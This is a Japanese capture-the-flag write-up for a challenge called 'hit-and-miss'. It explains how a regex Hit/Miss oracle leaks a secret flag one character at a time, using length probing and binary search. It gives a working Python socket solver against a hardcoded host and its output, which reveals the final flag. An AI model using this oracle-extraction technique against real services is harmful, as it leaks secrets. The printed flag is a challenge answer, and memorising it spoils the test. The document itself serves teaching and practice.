# Writeup: hit-and-miss

## 概要
`app.py` は入力された正規表現を `FLAG` に対して `re.match` で判定し、Hit/Miss を返すだけのオラクルになっている。`re.match` は先頭一致なので、正規表現で「次の1文字がどの集合に入るか」を質問すれば、前方から1文字ずつ確定できる。

## 方針
1. `^Alpaca\{\w{N}\}$` を使って長さを特定する。
2. 既知のプレフィックス `P` に対して `^Alpaca\{P[subset]\w*\}$` を投げ、次の1文字が `subset` に入るかを二分探索で判定する。
3. これを長さ分繰り返し、フラグを復元する。

## sol.py の説明
`sol.py` はソケットでサービスに接続し、Hit/Miss の返答を利用してフラグを自動復元するスクリプト。

- `recv_until` でプロンプト（`regex> `）まで受信して同期を取る。
- `query` で正規表現を送信し、返ってきた文字列に `Hit!` が含まれるかで真偽を判定する。
- `find_length` が `^Alpaca\{\w{N}\}$` を順に試し、長さを確定する。
- `bsearch_next_char` が「次の1文字」の候補集合を二分探索で絞り込む。`^Alpaca\{PREFIX[subset]\w*\}$` を投げ、Hitなら左側、Missなら右側に探索を進める。
- これを長さ分繰り返し、`prefix` を完成させて `Alpaca{...}` を復元する。

## sol.py ソースコード
```python
import socket
import string

HOST = "34.170.146.252"
PORT = 39603
MAX_LEN = 64  # Reasonable upper bound for the flag length.

ALPHABET = string.ascii_uppercase + string.ascii_lowercase + string.digits + "_"

def recv_until(sock, needle=b"regex> "):
    data = b""
    while needle not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

def query(sock, pattern: str) -> bool:
    # Send one regex and check whether the response includes "Hit!".
    sock.sendall((pattern + "\n").encode())
    data = recv_until(sock)
    return b"Hit!" in data

def esc_class(chars: str) -> str:
    # Escape chars for a regex character class.
    return chars.replace("\\", "\\\\").replace("]", "\\]").replace("-", "\\-").replace("^", "\\^")

def find_length(sock) -> int:
    for n in range(1, MAX_LEN + 1):
        pat = rf"^Alpaca\{{\w{{{n}}}\}}$"
        if query(sock, pat):
            return n
    raise RuntimeError("length not found")

def bsearch_next_char(sock, prefix: str, charset: str) -> str:
    # charset is ordered; binary-search the next character.
    lo = 0
    hi = len(charset) - 1
    while lo < hi:
        mid = (lo + hi) // 2
        subset = charset[lo:mid + 1]
        pat = rf"^Alpaca\{{{prefix}[{esc_class(subset)}]\w*\}}$"
        if query(sock, pat):
            hi = mid
        else:
            lo = mid + 1
    return charset[lo]

def main():
    with socket.create_connection((HOST, PORT)) as sock:
        recv_until(sock)
        length = find_length(sock)
        print("length =", length)

        prefix = ""
        for _ in range(length):
            # If the first char is known (e.g. uppercase), shrink charset here.
            c = bsearch_next_char(sock, prefix, ALPHABET)
            prefix += c
            print("prefix =", prefix)

        flag = f"Alpaca{{{prefix}}}"
        print("flag =", flag)

if __name__ == "__main__":
    main()
```

## 結果
```
length = 15
prefix = R
prefix = Re
prefix = Reg
prefix = Reg3
prefix = Reg3x
prefix = Reg3x_
prefix = Reg3x_C
prefix = Reg3x_Cr
prefix = Reg3x_Cro
prefix = Reg3x_Cros
prefix = Reg3x_Cross
prefix = Reg3x_Crossw
prefix = Reg3x_Crossw0
prefix = Reg3x_Crossw0r
prefix = Reg3x_Crossw0rd
flag = Alpaca{Reg3x_Crossw0rd}
```

最終的なフラグは `Alpaca{Reg3x_Crossw0rd}`。
